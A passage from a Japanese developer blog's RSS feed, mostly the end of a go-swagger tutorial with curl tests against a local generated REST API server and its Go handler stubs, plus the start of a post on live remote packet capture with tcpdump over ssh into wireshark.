      --read-timeout=      maximum duration before timing out read of the request (default: 30s)
      --write-timeout=     maximum duration before timing out write of the response (default: 60s)
      --tls-host=          the IP to listen on for tls, when not specified it's the same as --host [$TLS_HOST]
      --tls-port=          the port to listen on for secure connections, defaults to a random value [$TLS_PORT]
      --tls-certificate=   the certificate to use for secure connections [$TLS_CERTIFICATE]
      --tls-key=           the private key to use for secure conections [$TLS_PRIVATE_KEY]
      --tls-listen-limit=  limit the number of outstanding requests
      --tls-keep-alive=    sets the TCP keep-alive timeouts on accepted connections. It prunes dead TCP connections ( e.g. closing laptop mid-download)
      --tls-read-timeout=  maximum duration before timing out read of the request
      --tls-write-timeout= maximum duration before timing out write of the response

Help Options:
  -h, --help               Show this help message
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;証明書と鍵が必要みたいなので、自己証明書と鍵を作成して食わせる。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ openssl req -new -x509 -nodes -days 365 -out wsk.crt -keyout wsk.key
$ wskapi-server --tls-certificate=./wsk.crt --tls-key=./wsk.key
2016/12/02 16:17:29 Serving wskapi at https://127.0.0.1:44176
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;api-server&quot;&gt;api-serverの挙動の調査&lt;/h1&gt;

&lt;p&gt;コードを実装したばかりの段階ではもちろん、データを得ることも、データを追加することもできない。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ユーザデータ取得&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -i --insecure https://127.0.0.1:55617/v1/users
HTTP/1.1 501 Not Implemented
Content-Type: application/json
Date: Fri, 02 Dec 2016 07:59:18 GMT
Content-Length: 55

&quot;operation user.GetUsers has not yet been implemented&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;ユーザ追加&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -i --insecure -X POST https://127.0.0.1:55617/v1/users
HTTP/1.1 422 Unprocessable Entity
Content-Type: application/json
Date: Fri, 02 Dec 2016 08:04:00 GMT
Content-Length: 51

{&quot;code&quot;:602,&quot;message&quot;:&quot;email in query is required&quot;}

$ curl -i --insecure -X POST -d &quot;email=hogehoge@hoge.org&quot; -d &quot;username=hogehoge&quot; https://127.0.0.1:55617/v1/users
HTTP/1.1 500 Internal Server Error
Content-Type: application/json
Date: Fri, 02 Dec 2016 08:06:07 GMT
Content-Length: 85

{&quot;code&quot;:500,&quot;message&quot;:&quot;no consumer registered for application/x-www-form-urlencoded&quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;ユーザ削除&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -i --insecure -X DELETE https://127.0.0.1:55617/v1/users/1
HTTP/1.1 501 Not Implemented
Content-Type: application/json
Date: Fri, 02 Dec 2016 08:07:39 GMT
Content-Length: 60

&quot;operation user.DeleteUsersID has not yet been implemented&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;api&quot;&gt;APIの実装と修正&lt;/h1&gt;

&lt;p&gt;基本的にconfigureAPI関数を修正することで、APIの挙動を変更することができるようだ。&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;restapi&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;crypto/tls&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;net/http&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errors&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;github.com/go-openapi/errors&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;runtime&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;github.com/go-openapi/runtime&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;middleware&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;github.com/go-openapi/runtime/middleware&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;github.com/KosukeShimofuji/wskapi/restapi/operations&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;github.com/KosukeShimofuji/wskapi/restapi/operations/user&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// This file is safe to edit. Once it exists it will not be overwritten&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;//go:generate swagger generate server --target .. --name wskapi --spec https://raw.githubusercontent.com/KosukeShimofuji/WebSHKiller/master/_swagger.yml&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;configureFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;operations&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WskapiAPI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// api.CommandLineOptionsGroups = []swag.CommandLineOptionsGroup{ ... }&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;configureAPI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;operations&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WskapiAPI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Handler&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// configure the api here&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServeError&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServeError&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// Set your custom logger if needed. Default one is log.Printf&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// Expected interface func(string, ...interface{})&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// Example:&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// s.api.Logger = log.Printf&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JSONConsumer&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JSONConsumer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JSONProducer&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JSONProducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserDeleteUsersIDHandler&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeleteUsersIDHandlerFunc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeleteUsersIDParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;middleware&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Responder&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;middleware&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NotImplemented&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;operation user.DeleteUsersID has not yet been implemented&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserGetUsersHandler&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetUsersHandlerFunc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetUsersParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;middleware&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Responder&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;middleware&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NotImplemented&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;operation user.GetUsers has not yet been implemented&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserPatchUsersIDHandler&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PatchUsersIDHandlerFunc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PatchUsersIDParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;middleware&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Responder&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;middleware&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NotImplemented&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;operation user.PatchUsersID has not yet been implemented&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserPostUsersHandler&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PostUsersHandlerFunc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PostUsersParams&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;middleware&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Responder&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;middleware&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NotImplemented&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;operation user.PostUsers has not yet been implemented&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServerShutdown&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setupGlobalMiddleware&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Serve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setupMiddlewares&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// The TLS configuration before HTTPS server starts.&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;configureTLS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tlsConfig&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// Make all necessary changes to the TLS configuration here.&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// The middleware configuration is for the handler executors. These do not apply to the swagger.json document.&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// The middleware executes after routing but before authentication, binding and validation&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setupMiddlewares&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Handler&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// The middleware configuration happens before anything, this middleware also applies to serving the swagger.json document.&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;// So this is a good place to plug in a panic handling middleware, logging and metrics&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setupGlobalMiddleware&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Handler&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;section&quot;&gt;まとめ&lt;/h1&gt;

&lt;p&gt;しっかりしたWeb ApplicationにRestful APIを組み込みたいなら、&lt;a href=&quot;https://revel.github.io/&quot;&gt;revel&lt;/a&gt;や&lt;a href=&quot;https://gin-gonic.github.io/gin/&quot;&gt;gin&lt;/a&gt;の方が良さそうだけど、さくっとrestful api対応の小さなアプリケーションを作りたいなら、go-swaggerのコード生成機能は手軽に使えそうな印象。
modelをdatabaseに対応させるにはAPIに対応する関数に、ORマッパ使ったりして結構コードを書かないといけなさそう。&lt;/p&gt;

&lt;h1 id=&quot;section-1&quot;&gt;参考文献&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;http://qiita.com/tags/swagger&lt;/li&gt;
  &lt;li&gt;http://qiita.com/magaya0403/items/0419d84d8df7784ac465&lt;/li&gt;
  &lt;li&gt;http://qiita.com/y_matsuwitter/items/3a847c22bbb84d9dff98&lt;/li&gt;
  &lt;li&gt;https://godoc.org/github.com/go-swagger/go-swagger&lt;/li&gt;
  &lt;li&gt;https://aaronsaray.com/2016/using-json-patch-in-swagger.html&lt;/li&gt;
  &lt;li&gt;https://goswagger.io/&lt;/li&gt;
  &lt;li&gt;https://github.com/go-swagger/go-swagger/tree/master/examples&lt;/li&gt;
  &lt;li&gt;http://blog.narenarya.in/build-rest-api-go-mysql.html&lt;/li&gt;
  &lt;li&gt;https://revel.github.io/&lt;/li&gt;
  &lt;li&gt;https://gin-gonic.github.io/gin/&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Fri, 02 Dec 2016 10:00:00 +0900</pubDate>
        <link>https://kosukeshimofuji.jp/2016/12/02/swagger/</link>
        <guid isPermaLink="true">https://kosukeshimofuji.jp/2016/12/02/swagger/</guid>
        
        
        <category>Develop</category>
        
      </item>
    
      <item>
        <title>リモートのLinuxのパケットをwireshrakでリアルタイムキャプチャする</title>
        <description>&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh host.test &quot;sudo tcpdump -i eth0 -U -s0 -w - 'not port 22'&quot; | wireshark -k -i -
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;section&quot;&gt;参考文献&lt;/h1&gt;

